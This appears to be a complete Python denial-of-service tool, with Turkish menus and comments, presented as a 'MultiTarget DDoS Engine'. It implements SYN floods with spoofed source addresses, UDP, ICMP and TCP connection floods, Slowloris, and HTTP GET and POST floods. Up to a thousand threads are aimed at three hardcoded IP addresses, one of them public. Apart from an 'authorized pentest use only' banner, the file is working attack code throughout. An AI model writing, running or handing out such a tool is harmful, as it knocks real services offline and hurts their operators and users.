#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MultiTarget DDoS Tool - Layer 4 & Layer 7
# Sadece yetkili pentestler için kullanın

import socket
import threading
import random
import time
import sys
import os
import ssl
import struct
import urllib.request
import urllib.error
from datetime import datetime

# HEDEF IP'LER (sabit, script'e gömülü)
TARGET_IPS = ["78.181.164.55", "192.168.1.140", "192.168.1.138"]
THREAD_COUNT = 1000
TIMEOUT = 5

# Banner
def banner():
    os.system('clear')
    print("""\033[1;31m
    ███╗   ███╗██╗   ██╗██╗  ████████╗██╗
    ████╗ ████║██║   ██║██║  ╚══██╔══╝██║
    ██╔████╔██║██║   ██║██║     ██║   ██║
    ██║╚██╔╝██║██║   ██║██║     ██║   ██║
    ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║
    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝
    \033[1;37m[ MultiTarget DDoS Engine v3.0 ]
    [ Layer 4 + Layer 7 | 3 Target IPs ]
    [\033[1;32m AUTHORIZED PENTEST USE ONLY \033[1;37m]
    \033[0m""")

# ==================== LAYER 4 METHODS ====================

def syn_flood(target_ip, target_port):
    """TCP SYN Flood - Layer 4"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        
        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00, 40, 0, 0x4000, 64, socket.IPPROTO_TCP,
            socket.inet_aton(src_ip), socket.inet_aton(target_ip)
        )
        
        # TCP Header (SYN flag)
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, 0, 0, 5 << 4, 0x02, 0, 0, 0
        )
        
        packet = ip_header + tcp_header
        s.sendto(packet, (target_ip, 0))
        s.close()
        return True
    except:
        return False

def udp_flood(target_ip, target_port):
    """UDP Flood - Layer 4"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(random.randint(1024, 65507))
        s.sendto(payload, (target_ip, target_port))
        s.close()
        return True
    except:
        return False

def icmp_flood(target_ip):
    """ICMP (Ping) Flood - Layer 4"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_type = 8
        icmp_code = 0
        checksum = 0
        id = random.randint(0, 65535)
        seq = 1
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, id, seq)
        data = random._urandom(random.randint(64, 2048))
        
        # Calculate checksum
        checksum = 0
        for i in range(0, len(header + data), 2):
            if i + 1 < len(header + data):
                w = (header + data)[i] + ((header + data)[i+1] << 8)
                checksum += w
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, id, seq)
        packet = header + data
        
        s.sendto(packet, (target_ip, 0))
        s.close()
        return True
    except:
        return False

def tcp_connection_flood(target_ip, target_port):
    """TCP Connection Flood - Layer 4"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((target_ip, target_port))
        # Bağlantıyı açık tut
        time.sleep(0.1)
        s.close()
        return True
    except:
        return False

# ==================== LAYER 7 METHODS ====================

def http_get_flood(target_url):
    """HTTP GET Flood - Layer 7"""
    try:
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        req = urllib.request.Request(target_url)
        req.add_header('User-Agent', random.choice(user_agents))
        req.add_header('Accept', '*/*')
        req.add_header('Accept-Language', 'en-US,en;q=0.5')
        req.add_header('Connection', 'keep-alive')
        req.add_header('Cache-Control', 'no-cache')
        req.add_header('Pragma', 'no-cache')
        req.add_header('X-Forwarded-For', f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        response.read()
        response.close()
        return True
    except:
        return False

def http_post_flood(target_url):
    """HTTP POST Flood - Layer 7"""
    try:
        data = random._urandom(random.randint(1024, 65536))
        req = urllib.request.Request(target_url, data=data)
        req.add_header('User-Agent', f"Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('Content-Length', str(len(data)))
        
        response = urllib.request.urlopen(req, timeout=TIMEOUT)
        response.read()
        response.close()
        return True
    except:
        return False

def slowloris_attack(target_ip, target_port):
    """Slowloris - Layer 7 (keep connections alive slowly)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((target_ip, target_port))
        
        # Partial HTTP request
        s.send(f"GET /{random.randint(0,999999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target_ip}\r\n".encode())
        s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
        
        # Keep sending headers slowly
        while True:
            s.send(f"X-Random-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
            time.sleep(random.uniform(5, 15))
    except:
        try:
            s.close()
        except:
            pass
        return False

# ==================== ATTACK ENGINE ====================

def layer4_worker(target_ip, target_port, method):
    """Layer 4 attack worker thread"""
    while running:
        try:
            if method == "syn":
                syn_flood(target_ip, target_port)
            elif method == "udp":
                udp_flood(target_ip, target_port)
            elif method == "icmp":
                icmp_flood(target_ip)
            elif method == "tcp_conn":
                tcp_connection_flood(target_ip, target_port)
        except:
            pass

def layer7_worker(target_url, method):
    """Layer 7 attack worker thread"""
    while running:
        try:
            if method == "get":
                http_get_flood(target_url)
            elif method == "post":
                http_post_flood(target_url)
        except:
            pass

def slowloris_worker(target_ip, target_port):
    """Slowloris worker thread"""
    while running:
        slowloris_attack(target_ip, target_port)
        time.sleep(0.1)

# Global flag
running = True

def start_attack(target_mode, target_value, attack_type, layer, port=80):
    """Start the attack on ALL 3 target IPs"""
    global running
    running = True
    
    print(f"\n\033[1;33m[+] Attack başlatılıyor...\033[0m")
    print(f"\033[1;36m[+] Hedef IP'ler: {', '.join(TARGET_IPS)}\033[0m")
    print(f"\033[1;36m[+] Saldırı Tipi: {attack_type.upper()}\033[0m")
    print(f"\033[1;36m[+] Katman: {layer}\033[0m")
    print(f"\033[1;36m[+] Thread Sayısı: {THREAD_COUNT}\033[0m")
    print(f"\033[1;31m[!] Durdurmak için Ctrl+C basın\033[0m\n")
    
    threads = []
    
    for target_ip in TARGET_IPS:
        if layer == "4":
            if attack_type in ["syn", "udp", "tcp_conn"]:
                for _ in range(THREAD_COUNT // 3):
                    t = threading.Thread(target=layer4_worker, args=(target_ip, port, attack_type))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif attack_type == "icmp":
                for _ in range(THREAD_COUNT // 3):
                    t = threading.Thread(target=layer4_worker, args=(target_ip, port, "icmp"))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif attack_type == "slowloris":
                for _ in range(THREAD_COUNT // 6):
                    t = threading.Thread(target=slowloris_worker, args=(target_ip, port))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif attack_type == "all":
                # Tüm Layer 4 metodlarını kullan
                methods = ["syn", "udp", "icmp", "tcp_conn"]
                for method in methods:
                    for _ in range(THREAD_COUNT // 12):
                        t = threading.Thread(target=layer4_worker, args=(target_ip, port, method))
                        t.daemon = True
                        threads.append(t)
                        t.start()
        
        elif layer == "7":
            # URL veya IP'den URL oluştur
            if target_mode == "url":
                base_url = target_value
            else:
                base_url = f"http://{target_ip}:{port}"
            
            if attack_type == "get":
                for _ in range(THREAD_COUNT // 3):
                    t = threading.Thread(target=layer7_worker, args=(base_url, "get"))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif attack_type == "post":
                for _ in range(THREAD_COUNT // 3):
                    t = threading.Thread(target=layer7_worker, args=(base_url, "post"))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif attack_type == "all":
                for method in ["get", "post"]:
                    for _ in range(THREAD_COUNT // 6):
                        t = threading.Thread(target=layer7_worker, args=(base_url, method))
                        t.daemon = True
                        threads.append(t)
                        t.start()
    
    # Combine Layer 4 + 7
    if layer == "all":
        for target_ip in TARGET_IPS:
            if target_mode == "url":
                base_url = target_value
            else:
                base_url = f"http://{target_ip}:{port}"
            
            # Layer 4
            for method in ["syn", "udp", "icmp"]:
                for _ in range(THREAD_COUNT // 18):
                    t = threading.Thread(target=layer4_worker, args=(target_ip, port, method))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            # Layer 7
            for method in ["get", "post"]:
                for _ in range(THREAD_COUNT // 18):
                    t = threading.Thread(target=layer7_worker, args=(base_url, method))
                    t.daemon = True
                    threads.append(t)
                    t.start()
    
    print(f"\033[1;32m[+] {len(threads)} thread başlatıldı\033[0m")
    print(f"\033[1;32m[+] 3 hedef IP'ye eş zamanlı saldırı devam ediyor...\033[0m")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print(f"\n\033[1;31m[!] Saldırı durduruldu.\033[0m")

# ==================== MAIN MENU ====================

def main():
    banner()
    
    # Check root (for raw sockets)
    if os.geteuid() != 0:
        print("\033[1;31m[!] SYN Flood ve ICMP Flood için root yetkisi gerekli!\033[0m")
        print("\033[1;33m[!] Termux'ta 'pkg install tsu' ve 'tsu' ile root alabilirsiniz\033[0m")
        print("\033[1;33m[!] Root yoksa UDP, TCP Connection, Layer 7 çalışır\033[0m\n")
    
    print("\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║        SALDIRI TİPİ SEÇİN            ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;37m[1]\033[1;36m Layer 4 - SYN Flood               ║\033[0m")
    print("\033[1;36m║  \033[1;37m[2]\033[1;36m Layer 4 - UDP Flood               ║\033[0m")
    print("\033[1;36m║  \033[1;37m[3]\033[1;36m Layer 4 - ICMP Flood              ║\033[0m")
    print("\033[1;36m║  \033[1;37m[4]\033[1;36m Layer 4 - TCP Connection Flood    ║\033[0m")
    print("\033[1;36m║  \033[1;37m[5]\033[1;36m Layer 4 - Slowloris               ║\033[0m")
    print("\033[1;36m║  \033[1;37m[6]\033[1;36m Layer 4 - TÜMÜ (max güç)          ║\033[0m")
    print("\033[1;36m║  \033[1;37m[7]\033[1;36m Layer 7 - HTTP GET Flood          ║\033[0m")
    print("\033[1;36m║  \033[1;37m[8]\033[1;36m Layer 7 - HTTP POST Flood         ║\033[0m")
    print("\033[1;36m║  \033[1;37m[9]\033[1;36m Layer 7 - TÜMÜ                   ║\033[0m")
    print("\033[1;36m║  \033[1;37m[10]\033[1;36m Layer 4 + Layer 7 KOMBO (max!)  ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    choice = input("\n\033[1;33m[?] Seçiminiz (1-10): \033[0m")
    
    # Map choices
    layer_map = {
        "1": ("4", "syn"), "2": ("4", "udp"), "3": ("4", "icmp"),
        "4": ("4", "tcp_conn"), "5": ("4", "slowloris"), "6": ("4", "all"),
        "7": ("7", "get"), "8": ("7", "post"), "9": ("7", "all"),
        "10": ("all", "all")
    }
    
    if choice not in layer_map:
        print("\033[1;31m[!] Geçersiz seçim!\033[0m")
        return
    
    layer, attack_type = layer_map[choice]
    
    # Target mode
    print("\n\033[1;36m╔════════════════════════════════════════╗\033[0m")
    print("\033[1;36m║          HEDEF TİPİ SEÇİN             ║\033[0m")
    print("\033[1;36m╠════════════════════════════════════════╣\033[0m")
    print("\033[1;36m║  \033[1;37m[1]\033[1;36m Site URL (örn: http://site.com)   ║\033[0m")
    print("\033[1;36m║  \033[1;37m[2]\033[1;36m IP + Port                         ║\033[0m")
    print("\033[1;36m╚════════════════════════════════════════╝\033[0m")
    
    target_choice = input("\n\033[1;33m[?] Seçiminiz (1-2): \033[0m")
    
    target_mode = None
    target_value = None
    port = 80
    
    if target_choice == "1":
        target_mode = "url"
        target_value = input("\n\033[1;33m[?] Hedef URL (http://site.com): \033[0m")
    elif target_choice == "2":
        target_mode = "ip"
        port = int(input("\n\033[1;33m[?] Port (örn: 80, 443, 22): \033[0m"))
        target_value = None  # IP'ler zaten sabit
    
    # Thread count
    global THREAD_COUNT
    try:
        tc = input(f"\n\033[1;33m[?] Thread sayısı (varsayılan: {THREAD_COUNT}): \033[0m")
        if tc.strip():
            THREAD_COUNT = int(tc)
    except:
        pass
    
    print(f"\n\033[1;32m{'='*50}\033[0m")
    print(f"\033[1;32m  HEDEFLER: 78.181.164.55, 192.168.1.140, 192.168.1.138\033[0m")
    print(f"\033[1;32m{'='*50}\033[0m")
    
    start_attack(target_mode, target_value, attack_type, layer, port)

if __name__ == "__main__":
    main()
